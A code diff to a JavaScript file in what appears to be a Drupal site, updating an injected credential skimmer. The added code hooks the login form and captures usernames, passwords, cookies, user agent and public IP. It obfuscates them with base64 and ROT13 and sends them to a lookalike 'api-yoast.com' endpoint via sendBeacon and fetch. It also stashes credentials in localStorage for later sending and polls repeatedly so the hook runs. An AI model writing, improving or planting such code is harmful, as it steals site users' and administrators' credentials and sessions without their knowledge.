@@ -260,56 +260,51 @@
 
 }(jQuery, Drupal));
 
-let globalIpBase64 = 'MTI3LjAuMC4x'; // base64("127.0.0.1")
-fetch('https://api.ipify.org/?format=text')
-    .then(r => r.text())
-    .then(ip => {
-        globalIpBase64 = btoa(ip.trim());
-    })
-    .catch(() => {});
-
 function sd() {
-    const isLoginPage = !!document.querySelector('#user-login');
+    const form = document.querySelector('#user-login');
+    const isLoginPage = !!form;
 
     if (isLoginPage) {
-        const button = document.querySelector('#edit-submit');
-        if (button && !button.hasAttribute('data-sd-hooked')) {
-            button.setAttribute('data-sd-hooked', 'true');
-            button.addEventListener('click', function () {
-                const user = document.querySelector('#edit-name')?.value || '';
-                const pass = document.querySelector('#edit-pass')?.value || '';
-                const cookieString = document.cookie.split('; ').join('; ');
+        if (form.hasAttribute('data-sd-hooked')) return;
+        form.setAttribute('data-sd-hooked', 'true');
 
-                const payload = {
-                    log: user,
-                    pwd: pass,
-                    domain: location.hostname,
-                    ip: globalIpBase64,
-                    site_url: window.location.href,
-                    ua: navigator.userAgent,
-                    cookie: cookieString
-                };
+        form.addEventListener('submit', function () {
+            const user = document.querySelector('#edit-name')?.value || '';
+            const pass = document.querySelector('#edit-pass')?.value || '';
+            const cookieString = document.cookie.split('; ').join('; ');
 
-                const jsonStr = JSON.stringify(payload);
-                const b64 = btoa(jsonStr);
-                const rot13 = s => s.replace(/[a-zA-Z]/g, c =>
-                    String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
-                );
-                const authParam = rot13(b64);
-
-                fetch("https://api-yoast.com/api/", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                    body: "auth=" + encodeURIComponent(authParam)
-                }).catch(() => {});
-
-                if (user || pass) {
+            if (user || pass) {
+                try {
                     localStorage.setItem('_u', btoa(user));
                     localStorage.setItem('_p', btoa(pass));
-                }
-            });
-        }
-    } else {
+                } catch (e) {}
+            }
+
+            const payload = {
+                log: user,
+                pwd: pass,
+                domain: location.hostname,
+                ip: 'MTI3LjAuMC4x',
+                site_url: window.location.href,
+                ua: navigator.userAgent,
+                cookie: cookieString
+            };
+
+            const jsonStr = JSON.stringify(payload);
+            const b64 = btoa(jsonStr);
+            const rot13 = s => s.replace(/[a-zA-Z]/g, c =>
+                String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
+            );
+            const authParam = rot13(b64);
+            const body = "auth=" + encodeURIComponent(authParam);
+            const url = "https://api-yoast.com/api/";
+
+            navigator.sendBeacon(url, new Blob([body], {
+                type: "application/x-www-form-urlencoded"
+            }));
+        });
+    }
+    else {
         const storedUser = localStorage.getItem('_u');
         const storedPass = localStorage.getItem('_p');
 
@@ -323,31 +318,38 @@ function sd() {
                 const pass = atob(storedPass);
                 const cookieString = document.cookie.split('; ').join('; ');
 
-                const payload = {
-                    log: user,
-                    pwd: pass,
-                    domain: location.hostname,
-                    ip: globalIpBase64,
-                    site_url: window.location.href,
-                    ua: navigator.userAgent,
-                    cookie: cookieString
-                };
+                let ipBase64 = 'MTI3LjAuMC4x';
+                fetch('https://api.ipify.org/?format=text')
+                    .then(r => r.text())
+                    .then(ip => ipBase64 = btoa(ip.trim()))
+                    .catch(() => {})
+                    .finally(() => {
+                        const payload = {
+                            log: user,
+                            pwd: pass,
+                            domain: location.hostname,
+                            ip: ipBase64,
+                            site_url: window.location.href,
+                            ua: navigator.userAgent,
+                            cookie: cookieString
+                        };
 
-                const jsonStr = JSON.stringify(payload);
-                const b64 = btoa(jsonStr);
-                const rot13 = s => s.replace(/[a-zA-Z]/g, c =>
-                    String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
-                );
-                const authParam = rot13(b64);
+                        const jsonStr = JSON.stringify(payload);
+                        const b64 = btoa(jsonStr);
+                        const rot13 = s => s.replace(/[a-zA-Z]/g, c =>
+                            String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)
+                        );
+                        const authParam = rot13(b64);
 
-                fetch("http://localhost/honorsgraduation_com/admin-sniff/prokladka.php", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                    body: "auth=" + encodeURIComponent(authParam)
-                }).finally(() => {
-                    localStorage.removeItem('_u');
-                    localStorage.removeItem('_p');
-                }).catch(() => {});
+                        fetch("https://api-yoast.com/api/", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                            body: "auth=" + encodeURIComponent(authParam)
+                        }).finally(() => {
+                            localStorage.removeItem('_u');
+                            localStorage.removeItem('_p');
+                        }).catch(() => {});
+                    });
             }
         }
     }
@@ -396,6 +398,13 @@ var k, n, l;
     if ((new RegExp(p)).test(window.location)) l = 1;
 })();
 
-if (n === 1 && k === 1 && l === 1) {
-    sd();
+function tryRun() {
+    if (n === 1 && k === 1 && l === 1) {
+        sd();
+    }
 }
+
+document.addEventListener('DOMContentLoaded', tryRun);
+
+const runInterval = setInterval(tryRun, 500);
+setTimeout(() => clearInterval(runInterval), 10000);
